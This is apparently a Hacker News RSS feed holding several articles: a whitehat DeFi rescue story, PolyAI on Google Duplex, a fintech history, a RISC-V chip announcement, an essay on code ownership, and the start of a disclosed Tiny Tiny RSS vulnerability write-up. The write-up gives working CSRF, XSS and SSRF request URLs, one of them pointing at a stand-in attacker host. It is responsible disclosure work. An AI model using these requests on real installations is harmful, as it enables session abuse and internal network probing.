US-based auditors would wake up, yet the clock was ticking. &nbsp;Knowing nothing much about CertiK beyond the fact it had serviced quite a few Asian projects, I tried to reach the CertiK China team to arbitrage the time zone difference. I blasted a casual sounding message in ‚ÄúDeFi the World‚Äù and ‚ÄúYellow Hats‚Äù WeChat groups. Four leads slid into my DMs independently within 30 minutes, confirming the WeChat ID that I connected with was indeed the real Zhaozhong Ni, CTO of CertiK. I was added to a WeChat group with 5 CertiK team members, yet at this point I was still not in a position to disclose the project nor the vulnerability. To minimize the exposure and potential liability, we could only invite one member from Certik to join our whitehat operation. After passing a final verification via official email, Georgios Delkos, the engineering lead at CertiK joined our call.</p><p>With Georgios‚Äôs help, Alex was able to quickly get in contact with the Lien team and verify their identity. We brought them up-to-speed on the current situation and asked for their permission to try working directly with a mining pool to rescue the vulnerable funds. After some deliberation, the Lien team agreed that the risk from trying to rescue the funds directly or publishing a warning was too high, and gave the go-ahead to continue.</p><p>Now we needed to identify a mining pool that had the infrastructure ready in place and would be willing to cooperate with us ASAP. Which mining pool should we tap? Which contact from the pool would be in a position to make technical decisions swiftly that help us beat the clock?</p><p>SparkPool came to mind, as I knew they had been working on a piece of public infrastructure called Taichi Network that could easily offer what we needed. I decided to ping Shaoping Zhang, SparkPool‚Äôs co-founder, who had helped me investigate mempool events in the past.</p><p>Half an hour later, Shaoping responded: ‚ÄúYou mean do we have a whitelist service for transactions? Sorry, we don‚Äôt.‚Äù Oops, something was lost in translation, ‚Äúwhitehat‚Äù and ‚Äúwhitelist‚Äù sounded similar in Chinese.</p><p>‚ÄúThere‚Äôs 10mn dollar worth of funds at risk. samczsun is on the line.‚Äù I tried again to communicate the situation without revealing any specifics.</p><figure><img src="https://samczsun.com/content/images/2020/09/photo5145442418169063579.png" alt="" srcset="https://samczsun.com/content/images/size/w600/2020/09/photo5145442418169063579.png 600w, https://samczsun.com/content/images/size/w1000/2020/09/photo5145442418169063579.png 1000w, https://samczsun.com/content/images/size/w1600/2020/09/photo5145442418169063579.png 1600w, https://samczsun.com/content/images/2020/09/photo5145442418169063579.png 1920w" sizes="(min-width: 720px) 720px"></figure><p>‚ÄúAre you guys saving the world again? Do you need help from our mining pool?‚Äù To my surprise and great relief, Shaoping jokingly extended an offer to help. After official email verification, Shaoping popped into our marathon Zoom call with the support of a roomful of SparkPool devs.</p><hr><p>After lunch, just when I was about to take a nap, I received a message from Tina: ‚ÄúHas SparkPool ever helped with whitehat transactions??‚Äù I mistook it for whitelisting a transaction at first. No whitehats had approached us before, and we were not familiar with what ‚Äúwhitehat transactions‚Äù entailed. After Tina explained it in more details, I realized that what they needed was a private transaction service, i.e. the whitehats wanted to send transactions to save a DeFi contract, but in order to prevent getting front-runned, they needed a mining pool to include the transaction without broadcasting it.</p><p>We had been working on a ‚Äúprivate transaction‚Äù feature on our Taichi Network, which was still under development and had not been tested. I brought the whitehats‚Äô request to our development team, and explained the urgency: our private transaction feature needed to be in production within a few hours. Our devs said they could try their best to finish in time, and we immediately got to work. We finished development of the private transaction feature in 2 hours, and then spent some time fixing bugs.</p><p>After we completed our internal testing, we sent the <em>whitehat.taichi.network</em> endpoint to ‚Ä¶</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://samczsun.com/escaping-the-dark-forest/">https://samczsun.com/escaping-the-dark-forest/</a></em></p>]]>
            </description>
            <link>https://samczsun.com/escaping-the-dark-forest/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580879</guid>
            <pubDate>Thu, 24 Sep 2020 17:09:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google Duplex Talks to an Automated Restaurant Conversational System]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580868">thread link</a>) | @kololski
<br/>
September 24, 2020 | https://www.polyai.com/our-voice-assistant-spoke-to-google-duplex-heres-what-happened/ | <a href="https://web.archive.org/web/*/https://www.polyai.com/our-voice-assistant-spoke-to-google-duplex-heres-what-happened/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				
				<div>
				
													<p><img src="https://www.polyai.com/wp-content/uploads/2019/08/nikola-1-500x500.jpg"></p><div>
							<h6>Nikola Mrk≈°iƒá</h6>
							<p><span>
								23 Sep 2020								- 5 minutes read							</span>
						</p></div>
						
										
				</div>
			</div><div>
									<p>This summer, Google has been deploying its AI voice assistant called Duplex to call bars and restaurants in order to update their opening hours on Google Maps listings.<br>
Here‚Äôs a call their system had with our virtual assistant for restaurants.</p>
<p><iframe src="https://player.vimeo.com/video/460586741" width="640" height="360" frameborder="0" allowfullscreen="allowfullscreen"><span data-mce-type="bookmark" style="display: inline-block; width: 0px; overflow: hidden; line-height: 0;" class="mce_SELRES_start">Ôªø</span><span data-mce-type="bookmark" style="display: inline-block; width: 0px; overflow: hidden; line-height: 0;" class="mce_SELRES_start">Ôªø</span></iframe></p>
<p>As far as we‚Äôre aware, this is the <strong>first naturally-occurring conversation between AI voice assistants in the wild</strong>. I have never seen anything like this before, and I‚Äôm incredibly proud that PolyAI is sharing this moment in computing history with our friends from Google.</p>
<p>After listening to the call, we‚Äôd say that it went pretty well! Google could have handled the two-part opening hours a bit better, but overall, the interaction was smooth. I want to share a few thoughts on what this means for the future of conversational technologies.</p>
<h3>Human language is a Universal API</h3>
<p>This interaction did not need to be a conversation in the way that we as humans think of it. The caller‚Äôs request was transactional and to the point. An API call or an HTTPS request between two web services would have done the job in 150ms, instead of two minutes of synthesized voice going back and forth across the telephone line. However, such APIs are not always available, or standardised. For instance, there are dozens of reservation APIs for restaurants used in the UK alone, and voice assistants will never integrate with every single one.</p>
<p>This kind of machine-to-machine conversational communication will become more commonplace as AI deployment accelerates. And while it may seem like an overkill from a technical standpoint, there are good reasons for these kinds of interactions to be conversational, rather than API calls.</p>
<p>Imagine you ask your virtual assistant ‚Äî Siri or Alexa, for example ‚Äî to book a hotel room. It can phone multiple hotels to check availability and book without having to integrate into each hotel‚Äôs individual booking API. And logs of the conversation can inform the user of alternative venues for their next trip.</p>
<h3>Welcome to the Uncanny Valley</h3>
<p>Google introduced <a href="https://ai.googleblog.com/2018/05/duplex-ai-system-for-natural-conversation.html">Duplex in May 2018</a> as an ‚ÄòAI system for accomplishing real-world tasks over the phone‚Äô. You may have seen this video of <a href="https://www.youtube.com/watch?v=D5VN56jQMWM">Sundar Pichai at Google I/O</a> using Duplex to make a restaurant reservation.</p>
<p>I‚Äôll be the first to point out how incredible Google‚Äôs TTS (text-to-speech) is in the Duplex/PolyAI call. It sounds like a human, much more so than our assistant does.</p>
<p>According to the <a href="https://en.wikipedia.org/wiki/Uncanny_valley">Uncanny Valley theory</a>, the more human-like a robot is, the more likely people are to feel positive towards it. However, at a certain point of human-likeness, the robot becomes a bit creepy, and people are repulsed by it.</p>
<p><img src="https://www.polyai.com/wp-content/uploads/2020/09/uncanny-valley.png" alt="" width="588" height="387" srcset="https://www.polyai.com/wp-content/uploads/2020/09/uncanny-valley.png 588w, https://www.polyai.com/wp-content/uploads/2020/09/uncanny-valley-300x197.png 300w" sizes="(max-width: 588px) 100vw, 588px"></p>
<p>In the Google/PolyAI call, Duplex really does sound like a human ‚Äì it does mention that it‚Äôs an automated service, but this is not enough. Why? Because crossing the Uncanny Valley means that a person on the call will treat the bot as though they are human.</p>
<p>Around the 1 minute mark, you‚Äôll hear our voice assistant ask the caller when they‚Äôd like to come in, and Duplex speaks over it. In reality, these are machines ‚Äì no-one‚Äôs getting offended. But when you listen to the call, the Duplex bot comes across as pretty rude. Because it sounds so human, it‚Äôs practically impossible to not attribute human qualities to the bot. And no one wants a rude voice assistant representing their company.</p>
<p><strong>Making customers think that your voice assistant is a real human is a sure-fire way to deliver frustrating customer experiences. At PolyAI, we work hard to make sure our voice assistants sit at the peak right before the Uncanny Valley ‚Äì but without crossing it. Warm and friendly enough to put callers at ease, but not real enough to cause cognitive dissonance.</strong></p>
<h3>The Future of Voice</h3>
<p>Companies are wising up to the benefits of conversational AI in customer communications, and we‚Äôll see a growing number of instances of machines communicating in human language. While this type of transactional communication may seem better suited to quick API calls, voice assistants can get the job done even when such APIs are not available.</p>
<p>We are super excited about the future of voice assistants. Two highly sophisticated voice assistants have now met in the wild, in a rerun of the legendary ‚ÄúDr Livingstone, I presume‚Äù moment (though neither assistant realised they were speaking to one of their own). This is a sign of great things to come. Stay tuned ‚Äì and get in touch with us if you want to build a great voice assistant for your brand.</p>
<p><strong>What do you think of the PolyAI vs Google Duplex call? Let us know on Twitter, <a href="https://twitter.com/poly_ai">@poly_ai</a>.</strong></p>
							</div></div>]]>
            </description>
            <link>https://www.polyai.com/our-voice-assistant-spoke-to-google-duplex-heres-what-happened/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580868</guid>
            <pubDate>Thu, 24 Sep 2020 17:08:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fintech Is Not New]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24580770">thread link</a>) | @mattmarcus
<br/>
September 24, 2020 | https://www.moderntreasury.com/journal/fintech-is-not-new | <a href="https://web.archive.org/web/*/https://www.moderntreasury.com/journal/fintech-is-not-new">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>There‚Äôs a myth going around now that fintech is a new industry, poised to take over, and that now that it‚Äôs here, every company will be a fintech company. The myth continues: some of the most promising new tech is of a new, different, novel flavor called ‚Äúfintech.‚Äù</p><p>In reality, though, fintech is just as old as "tech." For as long as engineers and entrepreneurs have been coming up with new technology amongst the hills of Cupertino and the orange groves of Mountain View, there have been fintech entrepreneurs right amongst them. And in many instances, the two groups have utilized the same technology advances to push the world forward.</p><h5>1956</h5><p>In 1956, the same year that William Shockley founded the Shockley Semiconductor Laboratory in Palo Alto, Bill Fair and Earl Isaac set up Fair, Isaac, &amp; Company, better known today as <a href="https://www.fico.com/">FICO</a>.&nbsp;</p><p>Bill Fair and Earl Isaac met at the Stanford Research Institute in Menlo Park and worked on a project as data heavy as it gets: the mathematics and statistics behind credit scoring tools for lenders. In 1956 they moved up north, invested $400 each in their new company, and set off to sell credit assessment systems to lenders. The FICO score as we know it today, set on a scale between 300 and 850, was not formulated until the 1980s, but the <a href="https://www.fico.com/en/about-us#history%20(edited)" target="_blank">FICO concept</a> started simultaneously with the semiconductor. Today we‚Äôd describe what they were doing as ‚Äúdata science.‚Äù&nbsp;</p><p>‚Äç</p><h5>1957</h5><p>The very next year, in 1957, as Arthur Rock was making one of the first venture capital investments in Fairchild Semiconductor, Bank of America‚Äôs team in San Francisco was coming up with the BankAmericard program, which launched in 1958. The famous ‚ÄúFresno drop,‚Äù <a href="#1">[1]</a> in which BofA mailed credit cards to everyone in Fresno, became <a href="https://usa.visa.com/">Visa</a>. Like many consumer fintech startups, it was riddled with fraud at first. But it turned a profit in 1961 and the rest is <a href="https://usa.visa.com/about-visa/our_business/history-of-visa.html" target="_blank">history</a>. Visa, in its pursuit of the perfect payment experience at a store or restaurant, drove some of the most demanding requirements on data center reliability, redundancy, and latency in the 1970s. Today we‚Äôd describe these as ‚Äúcloud services.‚Äù&nbsp;</p><p>‚Äç</p><h5>1968</h5><p>In 1968, Robert Noyce, Gordon Moore, Andy Grove, and several other high profile Fairchild employees left Fairchild to start Intel. They too turned to Arthur Rock for seed funding. That was the year Ross Perot‚Äôs Electronic Data Systems IPO‚Äôd on the strength of multimillion dollar contracts building early software necessary to enable Medicare and Medicaid. EDS <a href="https://www.dxc.technology/about_us/ds/140019-our_history" target="_blank">built</a> the backends of ATMs, electronic funds transfer, and point-of-sale terminals for banks and credit unions. Today we‚Äôd probably describe EDS as a ‚Äúbanking core‚Äù or, at the very least, a ‚Äúsystems integrator‚Äù for banks‚Äîsystems that eventually came to run on Intel chips.&nbsp;</p><p>‚Äç</p><h5>1972</h5><p>In 1972, the year Steve Jobs graduated from high school, Charles Schwab‚Äôs new startup began offering brokerage services.<a href="#1">[1]</a> The company grew and expanded, and in 1979 Schwab spent a fortune on the ‚ÄúBETA‚Äù system, which stood for ‚ÄúBrokerage Execution and Transaction Analysis.‚Äù That was the same year Bill Gates and Paul Allen moved their fledgling startup from Albuquerque to Seattle, and renamed it Microsoft from the previous, awkward ‚ÄúMicro-Soft.‚Äù Steve Ballmer joined Microsoft the following year, the year that Schwab used its now-stable BETA system to offer 24 hour stock price quotes.&nbsp;</p><p>‚Äç</p><h5>1984</h5><p>In 1984, Apple released the Macintosh. That same year, a group of entrepreneurs started a startup bank aimed at serving the tech industry that the traditional banks didn‚Äôt want to serve. When they opened their first branch in Mountain View, they needed something to attract PR, and they decided to <a href="https://www.computerhistory.org/collections/catalog/102739976" target="_blank">borrow</a> bunny suits from their first customers, which were semiconductor companies. The grand opening landed them in the local papers as the Valley wondered what was going on with this upstart bank with ‚Äúbankers‚Äù dressed in bunny suits, but the message was clear. That bank is now the familiar banking institution we know today as <a href="https://www.svb.com/">Silicon Valley Bank</a>. Their strategy, of focusing on startups, was radical, but it worked.&nbsp;</p><p>‚Äç</p><h5>Today</h5><p>There may be no better time to build fintech companies. </p><p>There‚Äôs no good reason for payments to take three days to settle in 2020. There‚Äôs no good reason for the most sophisticated companies in the world to pay workers on a rigid bimonthly schedule. There‚Äôs no good reason why predatory payday lenders are the best option for millions to turn to in economic hardship. There‚Äôs no good reason for the government to disburse stimulus funds by paper check delivered via the postal service. Each of these is an opportunity to build a product of real consequence.&nbsp;</p><p>But this industry is not new. If anything, today‚Äôs companies are just an extension of a long tradition. Square, Stripe, Adyen, Plaid, Brex, Modern Treasury, and others all stand on the shoulders of giants. We benefit from FICO‚Äôs pioneering work in instant decision making, Visa‚Äôs mastery of electronic payment networks, and SVB‚Äôs startup-focused business model. </p><p>If we study the lessons of history, we will build products with more impact.<br></p></div></div></div>]]>
            </description>
            <link>https://www.moderntreasury.com/journal/fintech-is-not-new</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580770</guid>
            <pubDate>Thu, 24 Sep 2020 16:59:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Shakti Announces Third Silicon Success with the Arduino-Compatible Moushik]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580748">thread link</a>) | @todsacerdoti
<br/>
September 24, 2020 | https://abopen.com/news/shakti-announces-third-silicon-success-with-the-arduino-compatible-moushik/ | <a href="https://web.archive.org/web/*/https://abopen.com/news/shakti-announces-third-silicon-success-with-the-arduino-compatible-moushik/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><b>The SHAKTI free and open source silicon project has reached another milestone with the boot up of the Moushik, an Arduino-compatible system-on-chip (SoC) and the group‚Äôs third successful silicon tape-out.</b></p>
<p>The SHAKTI project first announced its success in booting Linux on a home-grown RISC-V based processor <a href="https://abopen.com/news/shakti-project-boots-linux-on-home-grown-180nm-risc-v-silicon/">back in 2018</a>, initially on a chip built by US semiconductor giant Intel on a 22nm process, then on a chip built natively in India on a 180nm node at the ISRO Semiconductor Laboratory in Chandigarh.</p>
<p>Now, the SHAKTI team has announced its third physical chip: Moushik. ‚ÄúMoushik is a processor-cum-system on chip that would cater to the rapidly growing Internet of Things IOT devices that are integral part of smart cities of our digital India,‚Äù the team explains of the new device. ‚ÄúThree steps are involved in the making of a microprocessor chip: the design, the fabrication, and the post-silicon boot-up ‚Äì all these steps were done in India.</p>
<p>‚ÄúThe design was done in IIT Madras, the fabrication at the semiconductor laboratory Chandigarh, the motherboard printed circuit board design was done again at IIT Madras, manufacturing of this motherboard at Bengaluru assembly and post-silicon boot-up at IIT Madras.‚Äù</p>
<p><span><iframe width="640" height="360" src="https://www.youtube.com/embed/KpRJe915-9I?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p>
<p>Again built on a 180nm process, Moushik has 103 input/output (IO) pins across a 256-pin package and is powered by the SHAKTI E-Class RISC-V core. The CPU runs at between 75MHz and 100MHz, while the SoC includes a number of common peripherals including an SDRAM controller, I¬≤C, quad-SPI, analogue-to-digital conversion (ADC), UART, and JTAG for debugging.</p>
<p>The motherboard, dubbed Adronics 1.0, includes support for Arduino ‚Äúshield‚Äù add-ons to speed embedded development. ‚ÄúIn addition the motherboard also has switcher ICs which enable power conversion across a large variety of voltages,‚Äù the team adds, ‚Äúthus enabling a variety of peripherals to be interfaceable with the motherboard. The PCB is a four layer motherboard with an input power of 12 volt at two amps.‚Äù</p>
<p>The chip can be seen going through the post-silicon boot-up process <a href="https://www.youtube.com/watch?v=KpRJe915-9I&amp;feature=youtu.be">in a video</a>, with more information available on the <a href="https://twitter.com/ShaktiProcessor/status/1308634777432461314?s=19">SHAKTI Twitter account</a>. For more information on the SHAKTI project in general, check out our interview with Arjun Menon and Rahul Bodduna in AB Open‚Äôs <a href="http://abopen.com/news/osddi-shakti-processor-iit-madras/">Open Source Digital Design Insights (OSDDI) series</a>.</p>

        </div></div>]]>
            </description>
            <link>https://abopen.com/news/shakti-announces-third-silicon-success-with-the-arduino-compatible-moushik/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580748</guid>
            <pubDate>Thu, 24 Sep 2020 16:57:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Strong Code Ownership]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24580700">thread link</a>) | @aard
<br/>
September 24, 2020 | https://flatwire.org/2018/10/18/strong-code-ownership/ | <a href="https://web.archive.org/web/*/https://flatwire.org/2018/10/18/strong-code-ownership/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-73">
	<!-- .entry-header -->

	<div>
		<p>Martin Fowler describes the three categories of code ownership utilized in most software projects:</p>
<blockquote><p>1. Strong code ownership breaks a code base up into modules (classes, functions, files) and assigns each module to one developer. Developers are only allowed to make changes to modules they own. If they need a change made to someone else‚Äôs module they need to talk to the module owner and get them to make the change. You can accelerate this process by writing a patch for the other module and sending that to the module owner.</p>
<p>2. Weak code ownership is similar in that modules are assigned to owners, but different in that developers are allowed to change modules owned by other people. Module owners are expected to take responsibility for the modules they own and keep an eye on changes made by other people. If you want to make a substantial change to someone else‚Äôs module it‚Äôs polite to talk it over with the module owner first.</p>
<p>3. Collective code ownership abandons any notion of individual ownership of modules. The code base is owned by the entire team and anyone may make changes anywhere. You can consider this as no code ownership, but it‚Äôs advocate prefer the emphasis on the notion of ownership by a team as opposed to an individual.¬π</p></blockquote>
<p>He continues to explain that, of the three, he only really dislikes strong code ownership and admits to a personal preference for ‚Äúthe dynamics of a collective code ownership‚Äù¬≤. Sadly, the agile community has largely followed suit with that opinion, and most companies now mandate that source code be modifiable by all. Such a policy comes at the expense of both quality and employee engagement. If you are aiming for a culture where engineers are both highly productive and take pride in their work, strong code ownership is your best option.</p>
<p>There are many compelling reasons to practice strong code ownership. I have written about some of them previously. In this essay, however, I want to visit the fascinating story of how China transformed itself economically by embracing the previously forbidden practice of ownership, or more specifically, the practice of allowing workers to reap the direct benefits of their labor.</p>
<p>In the 70‚Äôs, in China, there was no concept of private property. Farmers worked on collectives where the government took all that was produced and divided it equally among all families.</p>
<p>One such collective farm was located in the village of Xioagang where the people were struggling with a lack of food, resorting even to begging from other villages.</p>
<p>After realizing that something had to be done, secretly, they decided to parcel up their land among all the village families, allowing each to keep at least some of their own harvest, if it was bountiful enough.</p>
<p>They risked everything to try such an experiment as it was highly illegal, but in the end it was a great success. It netted a larger harvest ‚Äúthan in the previous 5 years combined‚Äù.</p>
<p>What was the difference? Just the rules of the game. In a word, ownership!</p>
<blockquote><p>It was the same land, the same tools and the same people. Yet just by changing the economic rules‚Ää‚Äî‚Ääby saying, you get to keep some of what you grow‚Ää‚Äî‚Ääeverything changed.¬≥</p></blockquote>
<p>Where before:</p>
<blockquote><p>There was no incentive to work hard‚Ää‚Äî‚Ääto go out to the fields early, to put in extra effort‚Å¥</p></blockquote>
<p>After the new arrangement, one could benefit from the fruits of their labor. They were the masters of their own fate.</p>
<p>Needless to say, it was not possible to hide their 5X increase in productivity from the government. But luckily, their actions where not viewed as treason but instead as instructional.</p>
<p>Among other reforms, China implemented the model of Xioagang‚Äôs partially privatized farm globally and ‚ÄúChina‚Äôs economy started to grow like crazy. Since 1978, something like 500 million people have risen out of poverty in China.‚Äù‚Åµ</p>
<p>What does ownership look like for software? How can you leverage the power of ownership to increase motivation and productivity in your organization? Obviously, developers don‚Äôt own their code in an absolute sense. When leaving a company, they can‚Äôt walk away with the code they wrote and use it somewhere else (unless it is open sourced). But they can own it in a way that gives the motivational benefits achieved but the Chinese Farmers of Xioagang. Parceling up the code base among coders makes everyone a custodian or steward over a piece of the application. They can be the guardian of its design, its test coverage, its coding standard. While taking pull requests, their detailed knowledge and emotional investment will make them rigorously attentive to what outside code can make it into their domain.</p>
<p>And what are the benefits that they reap from such efforts? The benefits are many:</p>
<ul>
<li>Mastery of a domain‚Ää‚Äî‚ÄäIf you don‚Äôt have a domain over which you have authority, this is impossible.</li>
<li>Pride of good workmanship‚Ää‚Äî‚ÄäYou have something to look back at and be proud of that you were responsible for.</li>
<li>Respect from peers‚Ää‚Äî‚ÄäOther people have something to look at and appreciate that you were responsible for.</li>
<li>Joy of knowing that you provided something of worth to others‚Ää‚Äî‚Ääit is easier to see how your work directly effected the customer.</li>
<li>The increasing ease of sustainability and re-usability that only comes from constant attention to the state of a code base‚Ää‚Äî‚ÄäIf you can‚Äôt be the gatekeeper to the code, it is constantly changing in ways that are outside your control.</li>
<li>A personal portfolio‚Ää‚Äî‚Ääyou can build up concrete work examples that demonstrate your skills. From a management perspective, how else can anyone be accurately assessed for their contributions. (Given that software metrics have all proven to be marginally useful.)</li>
</ul>
<p>All of these benefits are incompletely realized if not altogether lacking under a collectivist code ownership scheme.</p>
<p>Jeff Atwood makes a similar observation in his blog post, <em>You Gotta Own It</em>:</p>
<blockquote><p>‚Ä¶ if you do want great software, you have to let the developers own what they‚Äôre building. The developers are inevitably the ones who have the most control over the success or failure of the project. Creating an environment where your developers have no emotional attachment to the project they‚Äôre working on is a recipe for mediocre software‚Ää‚Äî‚Ääand job disillusionment.‚Å∂</p></blockquote>
<p>It is my belief that increasing employee engagement is the real secret to massive increases in productivity, more so than the latest process fad or flurry of team building activities. Strong code ownership is a pivotal part of securing that engagement.</p>
<h3>Sources</h3>
<p>3,4,5. <a href="https://www.npr.org/sections/money/2012/01/20/145360447/the-secret-document-that-transformed-china" target="_blank" rel="noopener">https://www.npr.org/sections/money/2012/01/20/145360447/the-secret-document-that-transformed-china</a></p>
<p>1,2. <a href="https://martinfowler.com/bliki/CodeOwnership.html" target="_blank" rel="noopener">https://martinfowler.com/bliki/CodeOwnership.html</a></p>
<p>6. <a href="https://blog.codinghorror.com/you-gotta-own-it/" target="_blank" rel="noopener">https://blog.codinghorror.com/you-gotta-own-it/</a></p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://flatwire.org/2018/10/18/strong-code-ownership/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580700</guid>
            <pubDate>Thu, 24 Sep 2020 16:54:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exploiting Tiny Tiny RSS]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580672">thread link</a>) | @fanf2
<br/>
September 24, 2020 | https://www.digeex.de/blog/tinytinyrss/ | <a href="https://web.archive.org/web/*/https://www.digeex.de/blog/tinytinyrss/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><em>Andrew Dolgov (main tt-rss developer) has resolved all the issues fast and it was a pleasure to do the disclosure with him. For a period of three days since our first contact with him, many security related changes were pushed, and with <a href="https://git.tt-rss.org/fox/tt-rss/commit/3588d5186ef7321fa573adbb62f42b05d7a138be">last commit</a> the gettext CVE finding was fixed. You can follow the discussion about our findings and fixes in the <a href="https://community.tt-rss.org/t/heads-up-several-vulnerabilities-fixed/3799">TinyTinyRSS Community forum</a>.</em></p><p>You can read the whole <a href="https://www.digeex.de/uploads/TinyTinyRSS.pdf">PDF report here</a>. Inside the report you will see mentions of the proof of concept (PoC) scripts. We have deliberately not published them to prevent script kiddie attacks.</p><p>After cloning <a href="https://git.tt-rss.org/fox/tt-rss/">the repository</a> first file we analyzed was in <code>classes/handler/public.php</code> as that was part that was accessible while unauthenticated. What we immediately noticed is that some functionalities there are not protected by CSRF token. At this time, logout and subscribe functions seemed like the only ones worth exploiting in this manner.</p><p>For forcefully subscribing user to your feed one can send GET requests to this URL: <code>/public.php?op=subscribe&amp;feed_url=http://your-site.com</code></p><p>For annoying user by logging them out, one can use this URL: <code>/public.php?op=logout</code></p><p>Incorporating these URLs into image tag in feed could be used for denial of service of sorts by subscribing users to a lot of unwanted feeds or logging him out whenever he views feed. However, this seemed more like an annoyance than a genuinely critical issue.</p><p>Thinking there is nothing left to see in the <code>public.php</code> file, we decided to explore webapp a bit without looking at the source code. Specifically, we were hunting for XSS vulnerabilities. We noticed that when login failed, the username would be visible in system logs (preferences-&gt;event log with an admin account), so we wanted to check if this could lead to XSS. Logging in with username <code>test&lt;aaa</code> yielded an interesting result.</p><figure><img src="https://www.digeex.de/content/images/2020/09/TinyTinyRSSPreferences-2.png" alt="" srcset="https://www.digeex.de/content/images/size/w600/2020/09/TinyTinyRSSPreferences-2.png 600w, https://www.digeex.de/content/images/2020/09/TinyTinyRSSPreferences-2.png 867w" sizes="(min-width: 720px) 720px"></figure><p>As we can see, only the part before <code>&lt;</code> got processed, and the rest was truncated.</p><p>We decided to check if it processes passwords the same way by adding <code>&lt;randomgarbage</code> to a valid password. To our surprise, we successfully logged in! This looks like a harmless gimmick initially as it gains no advantage to an attacker, but there is a curious edge-case.</p><p>Assume the user sets his/her password to <code>a&lt;verysecurepassword</code>, tt-rss gives no warning that <code>&lt;</code> should not be used in a password. Next time the user logs in with <code>a&lt;verysecurepassword</code>, it will be successful, but the only part before <code>&lt;</code> is being processed! Therefore it is also possible to log in just by using password <code>a</code>!</p><p>We decided to go back to source code analysis again. We rechecked <code>public.php</code> to see if we missed something. Indeed there was an interesting function: <code>pluginhandler</code>. tt-rss comes with several plugins installed by default (more can be added, but we were only interested in exploiting default tt-rss), and each has an <code>init.php</code> file with plugin class defined. With <code>pluginhandler</code> function, one can call public methods of plugin class (plugin name goes in <code>plugin</code> parameter and method name in <code>pmethod</code>). So we decided to check if there are any exploitable public methods.</p><p>After changing directory to <code>tt-rss/plugins</code> we grepped for <code>public function</code>. Method <code>imgproxy</code> in <code>af_proxy_http</code> plugin looked interesting.</p><p><strong>It should be noted that none of the vulnerabilities found require plugin to be enabled, it just needs to be installed (and it is, by default).</strong></p><p>At first there was slight disappointment, cause right at the beginning of the method, there was the following code:</p><pre><code>$url = rewrite_relative_url(get_self_url_prefix(), $_REQUEST["url"]);
// called without user context, let's just redirect to original URL

if (!$_SESSION["uid"]) {
        header("Location: $url");
        return;
}
</code></pre><p>We can supply the <code>url</code> parameter, but a redirect will be made to that URL (open redirect is not a significant attack vector for this web app) when unauthenticated. However, we decided to analyze the plugin further to see if feasible attack vectors could use minimal user interaction.</p><h2 id="first-xss-vulnerability">First XSS vulnerability</h2><p>Code continues like this:</p><pre><code>$local_filename = sha1($url);
...
$data = fetch_file_contents(["url" =&gt; $url, "max_size" =&gt; MAX_CACHE_FILE_SIZE]);
...
if (!$disable_cache) {
    if ($this-&gt;cache-&gt;put($local_filename, $data)) {
          header("Location: " . $this-&gt;cache-&gt;getUrl($local_filename));
          return;
          }
}
</code></pre><p>If user is authenticated and makes the request with <code>url</code> parameter, the plugin will compute sha1 hash of the URL, which will be the filename. The plugin will fetch the content hosted at the URL (using <code>libcurl</code> if it is installed) and store it at <code>{ttrss directory}/cache/images/{sha1 sum of the url}</code>, the file can also be accessed using <code>cached_view</code> functionality in <code>public.php</code>: <code>/public.php?op=cached_url&amp;file=images/{sha1 sum of the url}</code></p><p>What raised our suspicious is that we could not find any code enforcing that this file needs to be delivered as an image, so we tried to upload the HTML page and execute javascript.</p><p>Turns out it was successful! If the URL of the payload is supplied in the <code>url</code> parameter, the plugin will fetch the payload, store it in the cache directory, and then redirect users to view stored files.<br>Thus if the user clicks a link like this, javascript code can be executed:<br><code>/public.php?op=pluginhandler&amp;plugin=af_proxy_http&amp;pmethod=imgproxy&amp;url=http://attacker.site/xss.html</code></p><figure><img src="https://www.digeex.de/content/images/2020/09/60eb4a4da519ab8aa9656ac8defb9f68.png" alt="60eb4a4da519ab8aa9656ac8defb9f68"></figure><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-25789">CVE-2020-25789</a> was assigned to keep track of this vulnerability.</p><h2 id="ssrf">SSRF</h2><p>In addition to not enforcing MIME type, we also noticed a lack of internal address filtering. In other words, making requests to internal services was possible as an authenticated user.</p><p>An authenticated user could request this:<br><code>/public.php?op=pluginhandler&amp;plugin=af_proxy_http&amp;pmethod=imgproxy&amp;url=http://127.0.0.1:1234/sensitiveInternalPage.html</code></p><p>Alternatively, an unauthenticated attacker could leverage XSS described in the previous section to scan internal services.</p><h2 id="lfi">LFI</h2><p>We looked again at how <code>af_proxy_http</code> fetches content. In <code>plugins/af_proxy_http/init.php</code> the following line can be seen:<br><code>$data = fetch_file_contents(["url" =&gt; $url, "max_size" =&gt; MAX_CACHE_FILE_SIZE]);</code></p><p>Function <code>fetch_file_contents</code> is not a native PHP function but rather 